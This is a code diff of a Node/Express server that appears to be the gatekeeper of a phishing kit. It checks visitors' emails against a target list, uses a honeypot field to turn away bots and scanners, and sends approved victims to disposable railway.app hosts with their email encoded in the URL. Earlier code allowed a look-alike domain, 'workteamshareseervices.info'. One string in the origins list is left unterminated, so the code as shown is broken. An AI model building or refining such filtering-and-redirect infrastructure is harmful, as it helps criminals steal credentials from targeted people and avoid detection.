@@ -10,15 +10,35 @@ const rateLimit = require('express-rate-limit');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://kranamedeyrunamnoputbod.up.railway.app';
-const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app';
+const DEFAULT_REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://kranadeyrinamnoputbod.up.railway.app';
+const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bbbdjfhefghnoreasonam.up.railway.app';
 const DEBUG = process.env.DEBUG === 'true';
 
 let validEmails = new Set();
 let tokenMap = new Map();
 
-// ✅ Serve static files like /lalaland.html
+// ✅ Allowed frontend domains
+const allowedOrigins = [
+  'https://fronahadbedisnorresoam.up.railway.app,
+  'https://app2.io',
+  'https://yourmainfrontend.com'
+];
+
+// ✅ CORS configuration per-origin
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('CORS not allowed for this origin'));
+    }
+  },
+  credentials: true
+}));
+
+// ✅ Serve static files
 app.use(express.static(path.join(__dirname)));
 
 // ✅ Bot trap logic
@@ -34,9 +54,8 @@ app.use((req, res, next) => {
 // ✅ Security middleware
 app.use(helmet());
 app.use(express.json());
-app.use(cors({ origin: 'https://workteamshareseervices.info' }));
 
-// ✅ HTTPS enforcement
+// ✅ Force HTTPS
 app.use((req, res, next) => {
   if (req.headers['x-forwarded-proto'] !== 'https') {
     return res.redirect(`https://${req.headers.host}${req.url}`);
@@ -44,7 +63,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// ✅ Load and reload email whitelist
+// ✅ Load and auto-reload email list
 function loadEmails() {
   try {
     const data = fs.readFileSync(EMAIL_FILE, 'utf8');
@@ -78,9 +97,10 @@ app.use(rateLimit({
   message: { valid: false, message: 'Too many requests. Try again later.' }
 }));
 
-// ✅ Main verification route (NO CAPTCHA)
+// ✅ Email validation and redirect generation
 app.post('/api/check-email', async (req, res) => {
   const { email, middleName } = req.body;
+  const origin = req.headers.origin;
 
   if (middleName && middleName.trim() !== '') {
     return res.status(403).json({ valid: false, message: 'Bot activity detected' });
@@ -105,12 +125,18 @@ app.post('/api/check-email', async (req, res) => {
   }
 
   tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 });
-  const redirectUrl = `${BACKEND_BASE}/forward?token=${token}`;
 
+  // ✅ Set redirect based on origin
+  let redirectBase = DEFAULT_REDIRECT_BASE;
+  if (origin === 'https://fronahadbedisnorresoam.up.railway.app') redirectBase = 'https://kranaskranasra.up.railway.app';
+  if (origin === 'https://app2.io') redirectBase = 'https://kranaskranasra.up.railway.app';
+ 
+
+  const redirectUrl = `${redirectBase}/#${encoded}`;
   return res.json({ valid: true, redirectUrl });
 });
 
-// ✅ Final redirect logic
+// ✅ Token-based redirect
 app.get('/forward', (req, res) => {
   const { token } = req.query;
   const entry = tokenMap.get(token);
@@ -120,7 +146,7 @@ app.get('/forward', (req, res) => {
     return res.status(403).send('Invalid or expired token.');
   }
 
-  const finalUrl = `${REDIRECT_BASE}/#${entry.email}`;
+  const finalUrl = `${DEFAULT_REDIRECT_BASE}/#${entry.email}`;
   tokenMap.delete(token);
   res.redirect(finalUrl);
 });
